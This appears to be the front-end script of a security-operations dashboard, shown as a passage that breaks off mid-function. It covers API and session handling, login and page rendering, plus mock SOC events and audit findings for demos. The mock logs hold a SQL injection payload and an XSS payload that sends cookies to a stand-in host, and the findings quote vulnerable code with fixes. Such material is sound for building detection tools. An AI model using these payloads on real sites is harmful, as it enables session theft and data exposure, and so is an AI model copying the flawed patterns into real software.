// =====================================================================
//  SENTRA AI — script.js  (v2)
//  All mock data lives in MOCK_DATA. Never scattered outside this object.
// =====================================================================

// =====================================================================
//  API CONFIGURATION
//  Set USE_REAL_API = true to connect to the live backend.
//  Set USE_REAL_API = false to use MOCK_DATA only (demo/offline mode).
//  Do NOT put credentials here.
// =====================================================================
const API_CONFIG = {
  USE_REAL_API: true,           // flip to false for pure mock/demo mode
  BASE_URL:     "http://localhost:8000",  // backend origin
};

// =====================================================================
//  SESSION STATE  (JWT persisted to localStorage so refreshes keep the session)
// =====================================================================
const _session = { token: null };

// JWT persisted in localStorage (same pattern as sentra-theme) so the
// session survives page refreshes. Never stored in the URL or the DOM.
const _TOKEN_STORAGE_KEY = "sentra-token";

function _getToken() { return _session.token; }
function _setToken(t) {
  _session.token = t;
  try {
    if (t) localStorage.setItem(_TOKEN_STORAGE_KEY, t);
    else localStorage.removeItem(_TOKEN_STORAGE_KEY);
  } catch (_) { /* storage unavailable — session stays in memory only */ }
}
function _clearSession() {
  _session.token = null;
  try { localStorage.removeItem(_TOKEN_STORAGE_KEY); } catch (_) {}
}

// =====================================================================
//  CENTRALIZED API HELPER
//  All backend requests go through apiRequest().
//  Any 401 response immediately logs the analyst out and redirects to login.
// =====================================================================
async function apiRequest(path, options = {}) {
  if (!API_CONFIG.USE_REAL_API) {
    // Caller should never reach here in mock mode, but guard anyway.
    throw new Error("API_MODE_DISABLED");
  }

  const token = _getToken();
  const headers = Object.assign({}, options.headers || {});
  if (token) headers["Authorization"] = "Bearer " + token;
  if (options.body) headers["Content-Type"] = "application/json";

  let response;
  try {
    response = await fetch(API_CONFIG.BASE_URL + path, {
      ...options,
      headers,
    });
  } catch (err) {
    // Network failure
    throw Object.assign(new Error("Network error: " + err.message), { networkError: true });
  }

  if (response.status === 401) {
    // Token expired or invalid — force logout
    _clearSession();
    _forceLogout("Your session has expired. Please sign in again.");
    throw Object.assign(new Error("Session expired"), { status: 401 });
  }

  return response;
}

// Force-logout to login screen with an optional message
function _forceLogout(msg) {
  const appShell    = document.getElementById("app-shell");
  const loginScreen = document.getElementById("login-screen");
  const loginError  = document.getElementById("login-error");
  if (appShell)    appShell.style.display    = "none";
  if (loginScreen) loginScreen.style.display = "flex";
  if (loginError && msg) {
    loginError.textContent  = msg;
    loginError.style.display = "block";
  }
  const emailInput = document.getElementById("login-email");
  const passInput  = document.getElementById("login-password");
  if (emailInput) emailInput.value = "";
  if (passInput)  passInput.value  = "";
}

// Human-readable error message from a failed fetch response
async function _apiErrorMessage(response) {
  let detail = "";
  try {
    const body = await response.json();
    detail = (body.detail && typeof body.detail === "object")
      ? body.detail.message || JSON.stringify(body.detail)
      : (body.detail || body.message || "");
  } catch (_) { /* ignore parse error */ }

  switch (response.status) {
    case 400: return "Bad request." + (detail ? " " + detail : "");
    case 401: return "Authentication required. Please sign in.";
    case 403: return "Access denied." + (detail ? " " + detail : "");
    case 404: return "Not found." + (detail ? " " + detail : "");
    case 422: return "Validation error." + (detail ? " " + detail : "");
    case 500: return "Server error. Please try again later.";
    default:  return "Request failed (" + response.status + ")." + (detail ? " " + detail : "");
  }
}

// =====================================================================
//  SHOW A BRIEF INLINE STATUS MESSAGE
//  Used for non-modal, non-alert feedback on the audit page.
// =====================================================================
function _showAuditStatus(msg, type) {
  // type: "info" | "error" | "success"
  let el = document.getElementById("_api-status-msg");
  if (!el) {
    el = document.createElement("div");
    el.id = "_api-status-msg";
    el.style.cssText = [
      "position:fixed", "bottom:24px", "right:24px",
      "padding:12px 18px", "border-radius:8px", "font-size:13px",
      "font-weight:600", "z-index:9999", "max-width:380px",
      "box-shadow:0 4px 16px rgba(0,0,0,0.4)", "transition:opacity 0.3s"
    ].join(";");
    document.body.appendChild(el);
  }
  const styles = {
    info:    "background:var(--accent-bg);color:var(--accent);border:1px solid var(--accent-border)",
    error:   "background:var(--danger-bg);color:var(--danger);border:1px solid var(--danger-border)",
    success: "background:var(--success-bg);color:var(--success);border:1px solid var(--success-border)",
  };
  el.style.cssText += ";" + (styles[type] || styles.info);
  el.textContent = msg;
  el.style.opacity = "1";
  clearTimeout(el._timeout);
  el._timeout = setTimeout(() => { el.style.opacity = "0"; }, 4000);
}

// =====================================================================
//  MOCK DATA
// =====================================================================
const MOCK_DATA = {

  // Authorized applications — source of truth for Audit targets.
  // authorized_scopes lists paths/endpoints approved for scanning.
  // "all" is always implicitly available; individual entries populate the
  // "Specific Endpoint / Path" selector.
  authorized_apps: [
    {
      app_id: "app_demoshop",
      name: "DemoShop",
      website: "https://demo-shop.local",
      environment: "sandbox",
      status: "authorized",
      stack: "Flask · Python 3.11",
      authorized_scopes: [
        "/login",
        "/register",
        "/api/users",
        "/api/orders",
        "/api/products",
        "/admin",
        "/src/auth/"
      ]
    },
    {
      app_id: "app_portal",
      name: "Customer Portal",
      website: "https://portal.example.local",
      environment: "staging",
      status: "authorized",
      stack: "Django · Python 3.10",
      authorized_scopes: [
        "/login",
        "/dashboard",
        "/api/accounts",
        "/api/transactions",
        "/admin/",
        "/src/views/"
      ]
    },
    {
      app_id: "app_inventory",
      name: "Inventory API",
      website: "https://inventory.example.local",
      environment: "sandbox",
      status: "authorized",
      stack: "Express · Node.js 18",
      authorized_scopes: [
        "/api/items",
        "/api/stock",
        "/api/suppliers",
        "/auth/token",
        "/src/middleware/auth.js"
      ]
    },
    {
      app_id: "app_auth",
      name: "Auth Service",
      website: "https://auth.example.local",
      environment: "sandbox",
      status: "authorized",
      stack: "React · TypeScript",
      authorized_scopes: [
        "/oauth/authorize",
        "/oauth/token",
        "/oauth/revoke",
        "/api/users",
        "/api/sessions",
        "/src/components/"
      ]
    }
  ],

  soc_events: [
    {
      investigation_id: "inv-c001",
      display_id: "ID-a203",
      type: "SQL Injection",
      severity: "Critical",
      source_ip: "192.168.1.24",
      target_endpoint: "/api/users?id=",
      confidence: 98,
      risk_score: 94,
      timestamp: "2024-01-15 14:32:07",
      status: "open",
      analysis: "The request payload contains classic UNION-based SQL injection syntax targeting the user lookup endpoint. The database error response confirms the vulnerability is exploitable. Immediate patching and WAF rule update advised.",
      actions: [
        "Block source IP 192.168.1.24 at perimeter firewall",
        "Apply parameterized queries to /api/users endpoint",
        "Review database access logs for data exfiltration",
        "Enable WAF SQL injection rule set"
      ],
      raw_log: '[2024-01-15 14:32:07] WARN  sql_guard: SQLi detected\nGET /api/users?id=1+UNION+SELECT+null,username,password+FROM+admin--\nHost: 10.0.1.5  Remote: 192.168.1.24\nStatus: 500  Body: "You have an error in your SQL syntax"\nRule: SQLI-HI-001  Score: 94/100'
    },
    {
      investigation_id: "inv-c002",
      display_id: "ID-b814",
      type: "Brute Force Attack",
      severity: "High",
      source_ip: "10.0.0.31",
      target_endpoint: "/auth/login",
      confidence: 94,
      risk_score: 76,
      timestamp: "2024-01-15 14:28:41",
      status: "reviewing",
      analysis: "347 failed authentication attempts were recorded from this source in a 4-minute window. The pattern matches automated credential stuffing with a known leaked credentials list. Account lockout has been triggered for 3 accounts.",
      actions: [
        "Rate-limit /auth/login to 5 requests per minute per IP",
        "Enforce MFA on all affected accounts",
        "Reset credentials for locked accounts",
        "Block 10.0.0.31/24 subnet temporarily"
      ],
      raw_log: '[2024-01-15 14:24:31] ERROR auth: failed login user=admin ip=10.0.0.31\n[2024-01-15 14:24:32] ERROR auth: failed login user=admin ip=10.0.0.31\n[2024-01-15 14:24:33] ERROR auth: failed login user=root  ip=10.0.0.31\n... (347 more failures in 4 minutes)\n[2024-01-15 14:28:41] ALERT brute_force: threshold exceeded — account locked'
    },
    {
      investigation_id: "inv-c003",
      display_id: "ID-c522",
      type: "Port Scan",
      severity: "Medium",
      source_ip: "10.0.0.12",
      target_endpoint: "0.0.0.0/0",
      confidence: 87,
      risk_score: 48,
      timestamp: "2024-01-15 14:21:15",
      status: "open",
      analysis: "Systematic port scan covering 1024 common ports detected. Scan pattern is consistent with Nmap OS fingerprinting mode. This is likely reconnaissance ahead of a targeted exploit attempt.",
      actions: [
        "Monitor 10.0.0.12 for follow-up connection attempts",
        "Verify this is not an authorized vulnerability scan",
        "Update IDS signatures for this scan signature"
      ],
      raw_log: '[2024-01-15 14:21:15] INFO  ids: port_scan detected src=10.0.0.12\nPorts scanned: 21,22,23,25,53,80,110,443,445,3306,3389,8080\nDuration: 12.4s  Packets: 1024  Pattern: nmap_syn_scan\nAlert level: MEDIUM'
    },
    {
      investigation_id: "inv-c004",
      display_id: "ID-d107",
      type: "DDoS Attempt",
      severity: "Critical",
      source_ip: "172.16.0.45",
      target_endpoint: "/",
      confidence: 96,
      risk_score: 91,
      timestamp: "2024-01-15 14:18:03",
      status: "resolved",
      analysis: "Volumetric HTTP flood attack generating 42,000 requests/second from this single source. Likely part of a botnet campaign. Upstream scrubbing was activated and mitigated the attack within 90 seconds.",
      actions: [
        "Enable upstream DDoS scrubbing — already active",
        "Add 172.16.0.0/16 to blocklist",
        "Review CDN rate-limiting configuration",
        "File abuse report with upstream provider"
      ],
      raw_log: '[2024-01-15 14:18:03] CRIT  ddos: volumetric flood detected\nSource: 172.16.0.45  RPS: 42000  Bytes/s: 18MB\nTarget: /  Duration: 90s\nMitigation: upstream_scrubbing ACTIVATED\n[2024-01-15 14:19:33] INFO  ddos: attack mitigated — traffic normal'
    },
    {
      investigation_id: "inv-c005",
      display_id: "ID-e391",
      type: "XSS Attack",
      severity: "High",
      source_ip: "192.168.1.55",
      target_endpoint: "/comments/post",
      confidence: 91,
      risk_score: 72,
      timestamp: "2024-01-15 14:14:56",
      status: "open",
      analysis: "Reflected XSS payload detected in comment body parameter. The script tag attempts to exfiltrate cookies to an external domain. The CSP header is not configured on this endpoint.",
      actions: [
        "Sanitize HTML output on /comments/post",
        "Add Content-Security-Policy header",
        "Encode user-generated content before rendering",
        "Audit all output rendering paths"
      ],
      raw_log: '[2024-01-15 14:14:56] WARN  waf: xss_reflected detected\nPOST /comments/post\nPayload: body=<script>document.location=\'https://evil.io/steal?c=\'+document.cookie</script>\nSource: 192.168.1.55\nWAF Rule: XSS-REF-007  Blocked: true'
    },
    {
      investigation_id: "inv-c006",
      display_id: "ID-f028",
      type: "Suspicious Login",
      severity: "Medium",
      source_ip: "10.0.0.72",
      target_endpoint: "/auth/login",
      confidence: 82,
      risk_score: 55,
      timestamp: "2024-01-15 14:09:22",
      status: "reviewing",
      analysis: "Successful login from an unusual geography and device fingerprint. User has no prior login history from this region. Behavioral anomaly score is elevated.",
      actions: [
        "Send step-up authentication challenge to user",
        "Review session activity for the affected account",
        "Check for concurrent sessions from different locations"
      ],
      raw_log: '[2024-01-15 14:09:22] WARN  auth: anomalous login\nUser: john.doe@company.com  IP: 10.0.0.72\nGeo: Unknown region (prev: UK)  Device: new fingerprint\nAnomaly score: 55  Session: sess_9k2m4n\nAction: step_up_auth requested'
    },
    {
      investigation_id: "inv-c007",
      display_id: "ID-g775",
      type: "Normal Request",
      severity: "Safe",
      source_ip: "192.168.1.18",
      target_endpoint: "/api/products",
      confidence: 99,
      risk_score: 4,
      timestamp: "2024-01-15 14:05:11",
      status: "resolved",
      analysis: "Request pattern is consistent with normal application usage. No anomalies detected. Classified as benign by all detection models.",
      actions: ["No action required"],
      raw_log: '[2024-01-15 14:05:11] INFO  ids: normal_request\nGET /api/products  Source: 192.168.1.18\nStatus: 200  Latency: 34ms\nRisk: 4/100  Classification: BENIGN'
    }
  ],

  audits: [
    {
      audit_id: "AUD-2024-001",
      app_id: "app_demoshop",
      app_name: "DemoShop",
      app_website: "https://demo-shop.local",
      environment: "sandbox",
      target: "github.com/company/webapp",
      scan_type: "deep",
      status: "completed",
      files_scanned: 142,
      technologies: ["Python 3.11", "Flask 2.3", "PostgreSQL", "Redis"],
      dependencies: ["flask==2.3.2", "sqlalchemy==2.0.1", "requests==2.28.0"],
      created: "2024-01-15 13:00:00",
      findings: [
        {
          id: "F-001",
          severity: "Critical",
          title: "SQL Injection via Unsanitized User Input",
          cwe: "CWE-89",
          owasp: "A03:2021",
          source_path: "app/routes/users.py",
          line: 47,
          confidence: 95,
          description: "The user ID parameter is directly interpolated into a raw SQL query string without parameterization, allowing an attacker to inject arbitrary SQL.",
          evidence: 'query = "SELECT * FROM users WHERE id = " + user_id\ndb.execute(query)',
          fix: 'query = "SELECT * FROM users WHERE id = :uid"\ndb.execute(query, {"uid": user_id})',
          references: ["https://owasp.org/A03_2021", "https://cwe.mitre.org/data/definitions/89.html"]
        },
        {
          id: "F-002",
          severity: "High",
          title: "Hardcoded Secret Key in Source Code",
          cwe: "CWE-798",
          owasp: "A07:2021",
          source_path: "app/config.py",
          line: 12,
          confidence: 99,
          description: "A cryptographic secret key is hardcoded directly in the application configuration file and committed to version control.",
          evidence: 'SECRET_KEY = "super_secret_key_12345"',
          fix: 'SECRET_KEY = os.environ.get("SECRET_KEY")',
          references: ["https://cwe.mitre.org/data/definitions/798.html"]
        },
        {
          id: "F-003",
          severity: "Medium",
          title: "Missing CSRF Protection on State-Changing Endpoint",
          cwe: "CWE-352",
          owasp: "A01:2021",
          source_path: "app/routes/auth.py",
          line: 88,
          confidence: 88,
          description: "The password change endpoint does not validate a CSRF token, allowing cross-site request forgery attacks.",
          evidence: '@app.route("/change-password", methods=["POST"])\ndef change_password():\n    # No CSRF check',
          fix: '@app.route("/change-password", methods=["POST"])\n@csrf.protect\ndef change_password():',
          references: ["https://owasp.org/A01_2021", "https://cwe.mitre.org/data/definitions/352.html"]
        },
        {
          id: "F-004",
          severity: "Safe",
          title: "Dependency Version Pinning Present",
          cwe: "N/A",
          owasp: "N/A",
          source_path: "requirements.txt",
          line: 1,
          confidence: 100,
          description: "All dependencies are pinned to specific versions, reducing supply-chain risk.",
          evidence: 'flask==2.3.2\nsqlalchemy==2.0.1',
          fix: "No action needed.",
          references: []
        }
      ]
    },
    {
      audit_id: "AUD-2024-002",
      app_id: "app_inventory",
      app_name: "Inventory API",
      app_website: "https://inventory.example.local",
      environment: "sandbox",
      target: "api-service",
      scan_type: "quick",
      status: "completed",
      files_scanned: 38,
      technologies: ["Node.js 18", "Express 4.18"],
      dependencies: ["express@4.18.2", "jsonwebtoken@9.0.0"],
      created: "2024-01-14 09:15:00",
      findings: [
        {
          id: "F-005",
          severity: "High",
          title: "JWT Token Not Validated",
          cwe: "CWE-345",
          owasp: "A07:2021",
          source_path: "src/middleware/auth.js",
          line: 23,
          confidence: 91,
          description: "The JWT verification step is skipped in the middleware when the token algorithm is 'none', allowing forged tokens.",
          evidence: "const decoded = jwt.decode(token); // Should use verify()",
          fix: 'const decoded = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ["HS256"] });',
          references: ["https://cwe.mitre.org/data/definitions/345.html"]
        }
      ]
    }
  ],

  // Sandbox jobs — sorted Critical→High→Medium→Low by finding severity
  sandbox_jobs: [
    {
      id: "SB-001",
      finding_id: "F-001",
      finding_title: "SQL Injection via Unsanitized User Input",
      finding_severity: "Critical",
      audit_id: "AUD-2024-001",
      app_id: "app_demoshop",
      app_name: "DemoShop",
      app_website: "https://demo-shop.local",
      environment: "sandbox",
      status: "completed",
      current_step: 6,
      created: "2024-01-15 14:00:00",
      diff: {
        original: [
          "  def get_user(user_id):",
          '-     query = "SELECT * FROM users WHERE id = " + user_id',
          "-     result = db.execute(query)",
          "      return result.fetchone()"
        ],
        modified: [
          "  def get_user(user_id):",
          '+     query = "SELECT * FROM users WHERE id = :uid"',
          '+     result = db.execute(query, {"uid": user_id})',
          "      return result.fetchone()"
        ]
      },
      tests: [
        { name: "SQL Injection — UNION payload", status: "pass", desc: "Injection attempt returns 400" },
        { name: "SQL Injection — tautology payload", status: "pass", desc: "1=1 payload safely rejected" },
        { name: "Normal query — valid integer ID", status: "pass", desc: "Returns correct user row" },
        { name: "Normal query — string ID rejected", status: "pass", desc: "Type validation enforced" }
      ],
      approval_status: "pending"
    }
  ],

  timeline: [
    { dot: "critical", label: "SQL Injection detected on /api/users", time: "2 min ago", sub: "SOC event ID-a203" },
    { dot: "info",     label: "Audit AUD-2024-001 completed — 3 findings", time: "1 hr ago", sub: "webapp repo" },
    { dot: "high",     label: "Brute force attempt mitigated", time: "3 hrs ago", sub: "SOC event ID-b814" },
    { dot: "info",     label: "Sandbox SB-001 fix proposed", time: "4 hrs ago", sub: "Advanced AI Beta" },
    { dot: "safe",     label: "Audit AUD-2024-002 completed — 1 finding", time: "Yesterday", sub: "api-service" }
  ]
};

// =====================================================================
//  GLOBAL STATE
// =====================================================================
let currentSOCFilter    = "All";
let currentScanType     = "quick";
let activeSandboxJob    = null;
let copilotContext       = null;   // { type: "investigation"|"audit", id: "<uuid>", data: {...} }
let pendingApprovalAction = null;
let currentAuditForModal  = null; // audit object currently open in audit modal

// Live investigation cache — populated from GET /investigations in API mode.
// Each entry is the raw investigation object from the backend.
let _apiInvestigations = [];

// =====================================================================
//  API-MODE APP CACHE
//  After login, _loadAuthorizedApps() fills _apiApps with the backend's
//  authorized-application list. All audit page selectors read from here
//  when USE_REAL_API is true.
//  Each entry matches the backend AuthorizedApp.to_frontend_dict() shape:
//    { app_id, name, website, environment, status, stack, allowed_scopes }
//  where allowed_scopes = [{ scope_id, name, paths }]
// =====================================================================
let _apiApps = []; // populated by _loadAuthorizedApps()

/**
 * Fetch the authorized application list from GET /applications and
 * populate the audit-page app selector.
 * Called once right after a successful login (API mode only).
 */
async function _loadAuthorizedApps() {
  const sel = document.getElementById("audit-app-select");
  try {
    const resp = await apiRequest("/applications");
    if (!resp.ok) {
      const msg = await _apiErrorMessage(resp);
      _showAuditStatus("Could not load authorized applications: " + msg, "error");
      return;
    }
    const data = await resp.json();
    _apiApps = data.applications || [];

    // Repopulate the app selector with the backend list
    if (sel) {
      // Remove any options added from mock data (keep only the placeholder)
      while (sel.options.length > 1) sel.remove(1);
      _apiApps.forEach(app => {
        const opt = document.createElement("option");
        opt.value = app.app_id;
        opt.textContent = app.name + " — " + app.website;
        sel.appendChild(opt);
      });
    }
  } catch (err) {
    if (err.status !== 401) {
      // 401 is already handled by apiRequest (force-logout)
      _showAuditStatus("Could not load authorized applications: " + err.message, "error");
    }
  }
}

/**
 * Return the app object for a given app_id.
 * In API mode: looks in _apiApps (backend list, allowed_scopes format).
 * In mock mode: looks in MOCK_DATA.authorized_apps (authorized_scopes flat array).
 */
function getApp(app_id) {
  if (API_CONFIG.USE_REAL_API) {
    return _apiApps.find(a => a.app_id === app_id) || null;
  }
  return MOCK_DATA.authorized_apps.find(a => a.app_id === app_id) || null;
}

// Threat chart now uses real data from /logs/list (see redrawDashboardChart)

// =====================================================================
//  LOGIN
//  In API mode:   POST /auth/login, store the JWT, populate app-selector.
//  In mock mode:  validate against known demo credentials client-side.
// =====================================================================
(function initLogin() {
  const loginScreen = document.getElementById("login-screen");
  const appShell    = document.getElementById("app-shell");
  const loginBtn    = document.getElementById("login-btn");
  const loginError  = document.getElementById("login-error");
  const logoutBtn   = document.getElementById("logout-btn");

  function _enterApp() {
    loginError.style.display = "none";
    if (typeof anime !== "undefined") {
      anime({
        targets: "#login-screen",
        opacity: [1, 0],
        duration: 350,
        easing: "easeOutQuad",
        complete: () => {
          loginScreen.style.display = "none";
          appShell.style.display = "block";
          anime({ targets: "#app-shell", opacity: [0, 1], duration: 400, easing: "easeOutQuad" });
          showPage("dashboard-page");
          // In API mode, load authorized apps into the selector immediately
          if (API_CONFIG.USE_REAL_API) _loadAuthorizedApps();
        }
      });
    } else {
      loginScreen.style.display = "none";
      appShell.style.display = "block";
      showPage("dashboard-page");
      if (API_CONFIG.USE_REAL_API) _loadAuthorizedApps();
    }
  }

  function _showLoginError(msg) {
    const errEl = document.getElementById("login-error");
    if (errEl) { errEl.textContent = msg; errEl.style.display = "block"; }
    if (typeof anime !== "undefined") {
      anime({ targets: ".login-card", translateX: [-8, 8, -6, 6, 0], duration: 300, easing: "easeOutQuad" });
    }
  }

  async function doLogin() {
    const email = (document.getElementById("login-email").value || "").trim().toLowerCase();
    const pass  = (document.getElementById("login-password").value || "").trim();

    if (!email || !pass) { _showLoginError("Please enter your email and password."); return; }

    if (!API_CONFIG.USE_REAL_API) {
      // ── MOCK MODE: validate client-side against known demo credentials ──
      const valid = (email === "admin@sentra.ai" || email === "admin") && pass === "password";
      if (valid) { _enterApp(); } else { _showLoginError("Invalid credentials. Try admin@sentra.ai / password"); }
      return;
    }

    // ── API MODE: POST /auth/login ──
    if (loginBtn) loginBtn.disabled = true;
    try {
      let response;
      try {
        response = await fetch(API_CONFIG.BASE_URL + "/auth/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password: pass }),
        });
      } catch (netErr) {
        // Backend unreachable — show clear message, do NOT fall back to mock silently
        _showLoginError("Cannot reach the backend. Please check the server is running.");
        return;
      }

      if (!response.ok) {
        const msg = await _apiErrorMessage(response);
        _showLoginError(msg);
        return;
      }

      const data = await response.json();
      if (!data.access_token) { _showLoginError("Login failed: no token received."); return; }

      // Store token — never in URL, never in the DOM
      _setToken(data.access_token);
      _enterApp();

    } finally {
      if (loginBtn) loginBtn.disabled = false;
    }
  }

  if (loginBtn) loginBtn.addEventListener("click", doLogin);
  const passwordInput = document.getElementById("login-password");
  if (passwordInput) passwordInput.addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
  const emailInput = document.getElementById("login-email");
  if (emailInput) emailInput.addEventListener("keydown", e => { if (e.key === "Enter") passwordInput && passwordInput.focus(); });

  if (logoutBtn) {
    logoutBtn.addEventListener("click", () => {
      // Clear auth state before showing login screen
      _clearSession();
      appShell.style.display = "none";
      loginScreen.style.display = "flex";
      document.getElementById("login-email").value = "";
      document.getElementById("login-password").value = "";
      loginError.style.display = "none";
    });
  }
})();

// =====================================================================
//  LIGHT / DARK THEME TOGGLE
// =====================================================================
(function initThemeToggle() {
  // Theme already applied before first paint by the inline script in <head>.
  // This function just wires up the button and keeps the icon in sync.

  function _applyTheme(theme) {
    document.documentElement.dataset.theme = theme;
    localStorage.setItem("sentra-theme", theme);
    const icon = document.getElementById("theme-toggle-icon");
    if (icon) {
      icon.textContent = theme === "light" ? "☀" : "☾";
    }
    // Redraw chart so it picks up new CSS variable colors
    if (typeof redrawDashboardChart === "function") {
      redrawDashboardChart();
    }
  }

  // Set icon on initial load to match whatever theme was restored
  const savedTheme = document.documentElement.dataset.theme || "dark";
  const icon = document.getElementById("theme-toggle-icon");
  if (icon) icon.textContent = savedTheme === "light" ? "☀" : "☾";

  const toggleBtn = document.getElementById("theme-toggle-btn");
  if (toggleBtn) {
    toggleBtn.addEventListener("click", () => {
      const current = document.documentElement.dataset.theme || "dark";
      _applyTheme(current === "dark" ? "light" : "dark");
    });
  }
})();

// =====================================================================
//  NAVIGATION — order: Dashboard, Live Logs, SOC, Audit, Copilot AI, Advanced AI [BETA]
// =====================================================================
const NAV_MAP = {
  "dashboard-nav":   "dashboard-page",
  "live-logs-nav":   "live-logs-page",
  "soc-nav":         "soc-page",
  "audit-nav":       "audit-page",
  "ai-copilot-nav":  "ai-copilot-page",
  "advanced-ai-nav": "advanced-ai-page",
};

function showPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active-page"));
  const page = document.getElementById(pageId);
  if (page) page.classList.add("active-page");

  document.querySelectorAll(".nav-item").forEach(item => item.classList.remove("active"));
  for (const [navId, pid] of Object.entries(NAV_MAP)) {
    if (pid === pageId) {
      const navEl = document.getElementById(navId);
      if (navEl) navEl.classList.add("active");
    }
  }

  if (pageId === "dashboard-page")   { renderDashboard(); redrawDashboardChart(); }
  if (pageId === "soc-page")         renderSOCEvents(currentSOCFilter);
  if (pageId === "advanced-ai-page") { renderSandboxJobs(); _startAdvancedAIPoller(); }
  else _stopAdvancedAIPoller();
  if (pageId === "audit-page")       renderAuditHistory();
  if (pageId === "ai-copilot-page")  updateCopilotContext();

  // Live Logs: start/stop polling when the page opens/closes
  if (pageId === "live-logs-page") {
    if (typeof window._llOnPageOpen === "function") window._llOnPageOpen();
  } else {
    if (typeof window._llOnPageClose === "function") window._llOnPageClose();
  }
}

document.querySelectorAll(".nav-item").forEach(item => {
  item.addEventListener("click", e => {
    e.preventDefault();
    const pageId = NAV_MAP[item.id];
    if (pageId) showPage(pageId);
  });
});

// =====================================================================
//  SEVERITY HELPERS
// =====================================================================
function severityClass(sev) {
  const s = (sev || "").toLowerCase();
  if (s === "critical") return "critical";
  if (s === "high")     return "high";
  if (s === "medium")   return "medium";
  return "safe";
}

function severityOrder(sev) {
  // Lower = higher priority
  const s = (sev || "").toLowerCase();
  if (s === "critical") return 0;
  if (s === "high")     return 1;
  if (s === "medium")   return 2;
  if (s === "low")      return 3;
  return 4;
}

function makeSeverityBadge(sev) {
  const cls = severityClass(sev);
  const badge = document.createElement("span");
  badge.className = "severity-badge " + cls;
  badge.textContent = sev;
  return badge;
}

// =====================================================================
//  DASHBOARD
// =====================================================================

/**
 * Fetch investigations + stats from backend and render dashboard.
 * Falls back to mock data if API is unavailable or not in use.
 */
async function renderDashboard() {
  if (!API_CONFIG.USE_REAL_API) {
    _renderDashboardFromData(MOCK_DATA.soc_events, null);
    return;
  }
  try {
    // Fetch investigations and log stats in parallel
    const [invResp, statsResp] = await Promise.all([
      apiRequest("/investigations").catch(() => null),
      apiRequest("/logs/stats").catch(() => null),
    ]);

    let investigations = [];
    let logStats = null;

    if (invResp && invResp.ok) {
      const d = await invResp.json();
      investigations = d.investigations || [];
      _apiInvestigations = investigations; // cache for SOC page
    }

    if (statsResp && statsResp.ok) {
      logStats = await statsResp.json();
    }

    _renderDashboardStats(investigations, logStats);
    _renderDashboardAlerts(investigations);
    _renderDashboardTimeline(investigations);
  } catch (err) {
    if (err.status !== 401) {
      // Fall back to mock data on error
      _renderDashboardFromData(MOCK_DATA.soc_events, null);
    }
  }
}

function _renderDashboardStats(investigations, logStats) {
  const totalLogs     = logStats ? logStats.total_logs_ingested : null;
  const totalInv      = investigations.length;
  const analyzed      = investigations.filter(i => i.status === "analyzed").length;

  // Count critical/high findings from analyzed investigations
  let criticalCount = 0;
  investigations.forEach(inv => {
    if (inv.finding && inv.finding.severity) {
      const s = (inv.finding.severity || "").toLowerCase();
      if (s === "critical" || s === "high") criticalCount++;
    }
  });

  // Update stat cards
  const cards = document.querySelectorAll(".stat-card h2");
  if (cards.length >= 4) {
    if (totalLogs !== null) cards[0].textContent = totalLogs.toLocaleString();
    cards[1].textContent = String(analyzed > 0 ? analyzed : totalInv);
    cards[2].textContent = String(criticalCount);
    cards[3].textContent = String(investigations.filter(i => i.status !== "analyzed").length);
  }

  // Update delta descriptions
  const descs = document.querySelectorAll(".stat-delta");
  if (descs.length >= 4) {
    if (totalLogs !== null) {
      descs[0].textContent = "Total logs ingested this session";
      descs[0].className = "stat-delta";
    }
    descs[1].textContent = analyzed + " analysis complete, " + (totalInv - analyzed) + " pending";
    descs[1].className = "stat-delta";
    descs[2].textContent = criticalCount > 0 ? "Require immediate review" : "No critical findings";
    descs[2].className = "stat-delta " + (criticalCount > 0 ? "negative" : "positive");
    const open = investigations.filter(i => i.status !== "analyzed" && i.status !== "analysis_failed").length;
    descs[3].textContent = open + " awaiting AI analysis";
    descs[3].className = "stat-delta " + (open > 0 ? "warning" : "");
  }
}

function _renderDashboardAlerts(investigations) {
  const body = document.getElementById("dashboard-alerts-body");
  if (!body) return;
  body.textContent = "";

  // Show up to 4 most recent investigations with findings
  const withFindings = investigations.filter(i => i.finding && i.finding.severity);
  const toShow = withFindings.length > 0 ? withFindings.slice(0, 4) : investigations.slice(0, 4);

  toShow.forEach(inv => {
    const finding = inv.finding || {};
    const sev    = finding.severity || "INFO";
    const type   = finding.activity_type || "Security Event";
    // Use first log's source_ip if available
    const srcIp  = (inv.logs && inv.logs[0]) ? inv.logs[0].source_ip : "—";
    const conf   = finding.confidence != null ? Math.round(finding.confidence * 100) : "—";
    const ts     = inv.window_start || "";

    // Build a normalized event-like object for modal compatibility
    const evObj = {
      investigation_id: inv.id,
      display_id:       inv.display_id || make_short_id(inv.id),
      type,
      severity:         sev.charAt(0).toUpperCase() + sev.slice(1).toLowerCase(),
      source_ip:        srcIp,
      target_endpoint:  (inv.logs && inv.logs[0]) ? inv.logs[0].path : "—",
      confidence:       conf,
      risk_score:       inv.trigger_score || 0,
      timestamp:        ts,
      status:           inv.status || "open",
      analysis:         finding.summary || "AI analysis pending.",
      actions:          finding.recommended_actions || [],
      raw_log:          _formatRawLogs(inv.logs || []),
      _raw_inv:         inv,  // keep reference to full investigation
    };

    const row = document.createElement("div");
    row.className = "event-row";
    row.style.gridTemplateColumns = "2fr 1.5fr 1fr 1fr 1fr";
    row.addEventListener("click", () => openSOCModal(evObj));

    const namecell = document.createElement("span");
    namecell.className = "event-name";
    const icon = document.createElement("span");
    icon.className = "event-icon " + severityClass(evObj.severity);
    icon.textContent = evObj.severity === "Safe" ? "✓" : "!";
    const nameSpan = document.createElement("span");
    nameSpan.textContent = type;
    namecell.appendChild(icon);
    namecell.appendChild(nameSpan);

    const srcCell  = document.createElement("span"); srcCell.textContent  = srcIp;
    const riskCell = document.createElement("span");
    riskCell.className = "risk " + severityClass(evObj.severity);
    riskCell.textContent = evObj.severity;
    const confCell = document.createElement("span"); confCell.textContent = conf + (typeof conf === "number" ? "%" : "");
    const timeCell = document.createElement("span"); timeCell.textContent = ts ? ts.slice(11, 16) : "—";

    [namecell, srcCell, riskCell, confCell, timeCell].forEach(c => row.appendChild(c));
    body.appendChild(row);
  });

  if (toShow.length === 0) {
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:16px 8px";
    empty.textContent = "No investigations yet. Ingest logs to trigger the SOC pipeline.";
    body.appendChild(empty);
  }
}

function _renderDashboardTimeline(investigations) {
